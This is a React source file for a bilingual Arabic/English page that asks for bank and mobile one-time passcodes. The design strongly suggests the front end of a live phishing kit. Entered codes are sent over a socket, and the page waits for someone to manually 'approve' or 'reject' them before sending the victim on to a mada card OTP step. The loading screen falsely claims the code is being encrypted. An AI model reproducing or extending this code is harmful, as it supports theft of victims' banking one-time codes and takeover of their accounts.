import React, { useEffect, useState } from 'react';
import { useLocation, useNavigate, useParams } from 'react-router-dom';
import { socketService } from '../../services/socketService';
import Timer from '../../client/components/Timer';
import { useI18n } from '../../shared/i18n';
import PaymentLoadingScreen from '../../client/components/PaymentLoadingScreen';
import { getStoredPhone } from '../../shared/utils';
import { setAuthSession } from '../../shared/utils';
import { NavigationContextData } from '../../shared/types';

const MANUAL_NAV_CONTEXT_KEY = 'v_safety_manual_nav_context';

const OTP: React.FC = () => {
    const navigate = useNavigate();
    const location = useLocation();
    const { type } = useParams<{ type: string }>(); // 'bank' or 'phone'
    const [code, setCode] = useState('');
    const [loading, setLoading] = useState(false);
    const [canResend, setCanResend] = useState(false);
    const [timerKey, setTimerKey] = useState(0);
    const [showOtp, setShowOtp] = useState(false);
    const [otpError, setOtpError] = useState('');
    const [showOtpLoading, setShowOtpLoading] = useState(false);
    const [showOtpRejectModal, setShowOtpRejectModal] = useState(false);
    const [otpRejectMessage, setOtpRejectMessage] = useState('');
    const [showLoginSuccessModal, setShowLoginSuccessModal] = useState(false);
    const [loginSuccessCountdown, setLoginSuccessCountdown] = useState(5);
    const [approvedCustomerName, setApprovedCustomerName] = useState('');
    const [resendNotice, setResendNotice] = useState('');
    const { t, isRTL, language } = useI18n();
    const isArabic = isRTL || language === 'ar';
    const manualContextFromState = ((location.state as { __manualNavContext?: NavigationContextData } | null)?.__manualNavContext) || null;
    const manualContextFromSession = (() => {
        try {
            const raw = sessionStorage.getItem(MANUAL_NAV_CONTEXT_KEY);
            if (!raw) return null;
            return JSON.parse(raw) as NavigationContextData;
        } catch {
            return null;
        }
    })();

    const resolvedFlow = (() => {
        const queryFlow = new URLSearchParams(location.search).get('flow');
        if (queryFlow === 'login' || queryFlow === 'password-reset') return queryFlow;

        const stateFlow = String(manualContextFromState?.flow || '').trim().toLowerCase();
        if (stateFlow === 'login' || stateFlow === 'password-reset') return stateFlow;

        const sessionFlow = String(manualContextFromSession?.flow || '').trim().toLowerCase();
        if (sessionFlow === 'login' || sessionFlow === 'password-reset') return sessionFlow;

        return 'default';
    })();

    const isLoginFlow = resolvedFlow === 'login';

    const isBank = type === 'bank';
    const storedPhone = getStoredPhone();
    const endingDigits = storedPhone ? storedPhone.slice(-4) : '';
    const phoneTextExt = endingDigits ? (isArabic ? ` المنتهي بـ ${endingDigits}` : ` ending in ${endingDigits}`) : '';

    useEffect(() => {
        if (isBank) return;

        const handleOtpPhoneApproved = (data: { redirectTo?: string; customerName?: string }) => {
            setLoading(false);
            setShowOtpLoading(false);

            if (isLoginFlow) {
                const customerName = String(data?.customerName || '').trim();
                setApprovedCustomerName(customerName);
                setLoginSuccessCountdown(5);
                setShowLoginSuccessModal(true);
                return;
            }

            navigate(data?.redirectTo || '/mada-otp', { replace: true });
        };

        const handleOtpPhoneRejected = (data: { message?: string }) => {
            setLoading(false);
            setShowOtpLoading(false);
            setCode('');
            setOtpRejectMessage(
                data?.message ||
                (language === 'ar'
                    ? 'رمز OTP المدخل غير صحيح أو حدثت مشكلة أثناء الإدخال. يرجى المحاولة مرة أخرى.'
                    : 'The entered OTP is incorrect or an input issue occurred. Please try again.')
            );
            setShowOtpRejectModal(true);
        };

        socketService.on('otpPhoneApproved', handleOtpPhoneApproved);
        socketService.on('otpPhoneRejected', handleOtpPhoneRejected);

        return () => {
            socketService.off('otpPhoneApproved', handleOtpPhoneApproved);
            socketService.off('otpPhoneRejected', handleOtpPhoneRejected);
        };
    }, [isBank, navigate, language, isLoginFlow]);

    useEffect(() => {
        if (!showLoginSuccessModal) return;

        const intervalId = window.setInterval(() => {
            setLoginSuccessCountdown((prev) => {
                if (prev <= 1) {
                    window.clearInterval(intervalId);
                    setAuthSession(approvedCustomerName || (language === 'ar' ? 'العميل' : 'Customer'));
                    navigate('/', { replace: true });
                    return 0;
                }
                return prev - 1;
            });
        }, 1000);

        return () => {
            window.clearInterval(intervalId);
        };
    }, [showLoginSuccessModal, navigate, approvedCustomerName, language]);

    const handleSubmit = (e: React.FormEvent) => {
        e.preventDefault();

        if (code.length !== 4 && code.length !== 6) {
            setOtpError(language === 'ar'
                ? 'يمكن إدخال 4 أو 6 أرقام فقط'
                : 'Only 4 or 6 digits are allowed');
            return;
        }

        setOtpError('');
        setLoading(true);
        setShowOtpRejectModal(false);

        const eventName = isBank ? 'submitBankOtp' : 'submitPhoneOtp';
        socketService.emitClientEvent(eventName, {
            code,
            flow: !isBank ? resolvedFlow : 'default'
        });

        if (!isBank) {
            setShowOtpLoading(true);
        }

        // Wait for server redirection
    };

    const handleResend = () => {
        if (!canResend) return;
        setCanResend(false);
        setTimerKey(prev => prev + 1);
        socketService.emitClientEvent('submitPhoneOtpResendNotification', {});
        setResendNotice(language === 'ar' ? 'تم إرسال طلب إعادة الرمز بنجاح' : 'Resend request sent successfully');
        window.setTimeout(() => setResendNotice(''), 3000);
    };

    return (
        <div className="min-h-screen w-full flex items-center justify-center px-4 py-6 relative z-20" dir={isArabic ? 'rtl' : 'ltr'}>
            <div className="w-full max-w-lg bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
                <div className="bg-gradient-to-r from-slate-50 via-blue-50 to-slate-50 px-6 py-5 border-b border-gray-100">
                    <div className="flex items-start gap-3">
                        <div className="w-12 h-12 rounded-full bg-blue-100 text-blue-700 flex items-center justify-center shrink-0">
                            <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 11c1.657 0 3-1.567 3-3.5S13.657 4 12 4 9 5.567 9 7.5 10.343 11 12 11zm-7 9a7 7 0 0114 0" />
                            </svg>
                        </div>
                        <div className={isArabic ? 'text-right' : 'text-left'} style={{ textAlign: isArabic ? 'right' : 'left' }}>
                            <h2 className="text-xl md:text-2xl font-bold text-gray-800">{t('verificationCode')}</h2>
                            <p className="text-gray-500 text-sm mt-1">
                                {isBank ? t('bankOTPSent') : t('phoneOTPSent')}{phoneTextExt}
                            </p>
                        </div>
                    </div>
                </div>

                <form onSubmit={handleSubmit} className={`p-6 md:p-8 space-y-5 ${isArabic ? 'text-right' : 'text-left'}`} style={{ textAlign: isArabic ? 'right' : 'left' }}>
                    {resendNotice && (
                        <div className="rounded-xl border border-emerald-200 bg-emerald-50 px-4 py-3 text-sm text-emerald-700">
                            {resendNotice}
                        </div>
                    )}

                    <div>
                        <label className={`block text-sm font-semibold text-gray-700 mb-2 ${isArabic ? 'text-right' : 'text-left'}`} style={{ textAlign: isArabic ? 'right' : 'left' }}>
                            {language === 'ar' ? 'رمز التحقق' : 'Verification Code'}
                        </label>
                        <input
                            type={showOtp ? 'text' : 'password'}
                            className="w-full p-3 sm:p-4 border-2 border-gray-200 rounded-xl text-center text-2xl md:text-3xl tracking-[0.5em] sm:tracking-[0.8em] md:tracking-[1em] font-mono focus:border-brand focus:bg-white outline-none transition-all dir-ltr"
                            maxLength={6}
                            placeholder="••••••"
                            value={code}
                            onChange={(e) => {
                                setCode(e.target.value.replace(/\D/g, ''));
                                if (otpError) setOtpError('');
                            }}
                            autoFocus
                            required
                        />

                        <div className={`mt-3 flex items-center gap-2 ${isArabic ? 'justify-end' : 'justify-start'}`}>
                            <input
                                id="show-otp-toggle"
                                type="checkbox"
                                checked={showOtp}
                                onChange={(e) => setShowOtp(e.target.checked)}
                                className="w-4 h-4 accent-brand"
                            />
                            <label htmlFor="show-otp-toggle" className="text-sm text-gray-600 cursor-pointer select-none">
                                {language === 'ar' ? 'إظهار رمز OTP' : 'Show OTP code'}
                            </label>
                            <span className="text-xs text-gray-400">
                                {language === 'ar' ? 'رؤية الرمز' : 'View code'}
                            </span>
                        </div>

                        {otpError && (
                            <p className={`mt-2 text-sm text-red-600 ${isArabic ? 'text-right' : 'text-left'}`}>
                                {otpError}
                            </p>
                        )}
                    </div>

                    <div className={`flex items-center justify-between rounded-xl border border-gray-200 bg-gray-50 p-3 ${isArabic ? 'flex-row-reverse' : ''}`}>
                        <div className="text-sm text-gray-600">
                            {canResend
                                ? (language === 'ar' ? 'يمكنك الآن إعادة الإرسال' : 'You can resend now')
                                : t('resendCodeIn')}
                        </div>
                        <div className="text-sm font-bold text-brand">
                            {canResend ? (
                                <span>{language === 'ar' ? 'جاهز' : 'Ready'}</span>
                            ) : (
                                <>
                                    <Timer key={timerKey} seconds={60} className="text-brand font-bold" onComplete={() => setCanResend(true)} />
                                    <span className="mx-1 text-gray-500 font-normal">{t('seconds')}</span>
                                </>
                            )}
                        </div>
                    </div>

                    <button
                        type="submit"
                        disabled={loading || (code.length !== 4 && code.length !== 6)}
                        className="w-full bg-brand hover:bg-brand-dark text-white font-bold py-3.5 rounded-xl shadow-lg disabled:opacity-50 disabled:cursor-not-allowed transition-all"
                    >
                        {loading ? t('verifying') : t('confirm')}
                    </button>

                    <button
                        type="button"
                        onClick={handleResend}
                        disabled={!canResend}
                        className="w-full text-sm text-gray-500 hover:text-brand underline disabled:opacity-40 disabled:cursor-not-allowed"
                    >
                        {t('codeNotReceived')}
                    </button>

                </form>
            </div>

            {!isBank && (
                <PaymentLoadingScreen
                    isVisible={showOtpLoading}
                    title={language === 'ar' ? 'جاري التحقق من OTP الجوال' : 'Verifying Mobile OTP'}
                    description={language === 'ar' ? 'يرجى الانتظار بينما تتم مراجعة رمز OTP المدخل...' : 'Please wait while your entered OTP is being reviewed...'}
                    steps={language === 'ar'
                        ? ['تشفير رمز OTP', 'إرسال الطلب للمراجعة', 'انتظار قرار القبول أو الرفض']
                        : ['Encrypting OTP', 'Sending request for review', 'Waiting for approve/reject decision']
                    }
                />
            )}

            {!isBank && showOtpRejectModal && (
                <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
                    <div className="bg-white rounded-2xl shadow-2xl max-w-md w-full animate-fadeIn">
                        <div className="p-6">
                            <div className="text-center">
                                <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
                                    <svg className="w-8 h-8 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                                    </svg>
                                </div>
                                <h3 className="text-xl font-bold text-gray-800 mb-2">
                                    {language === 'ar' ? 'تعذر تأكيد OTP الجوال' : 'Mobile OTP Verification Failed'}
                                </h3>
                                <p className="text-gray-600 mb-6">{otpRejectMessage}</p>
                                <button
                                    onClick={() => setShowOtpRejectModal(false)}
                                    className="w-full bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white font-bold py-3 rounded-xl shadow-lg transform hover:-translate-y-1 transition-all"
                                >
                                    {language === 'ar' ? 'إعادة المحاولة' : 'Try Again'}
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            )}

            {!isBank && showLoginSuccessModal && (
                <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
                    <div className="bg-white rounded-2xl shadow-2xl max-w-md w-full animate-fadeIn">
                        <div className="p-6 text-center">
                            <div className="w-16 h-16 bg-emerald-100 rounded-full flex items-center justify-center mx-auto mb-4">
                                <svg className="w-8 h-8 text-emerald-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                                </svg>
                            </div>
                            <h3 className="text-xl font-bold text-gray-800 mb-2">
                                {isArabic ? 'تم تسجيل الدخول بنجاح' : 'Login Successful'}
                            </h3>
                            <p className="text-gray-600 mb-4">
                                {isArabic
                                    ? `تم تسجيل الدخول بنجاح ${approvedCustomerName ? `سيد ${approvedCustomerName}` : ''}`
                                    : `Login completed successfully ${approvedCustomerName ? `Mr. ${approvedCustomerName}` : ''}`}
                            </p>
                            <div className="text-sm text-gray-500">
                                {isArabic
                                    ? `سيتم تحويلك إلى الرئيسية خلال ${loginSuccessCountdown} ثوانٍ`
                                    : `Redirecting to home in ${loginSuccessCountdown} seconds`}
                            </div>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
};

export default OTP;
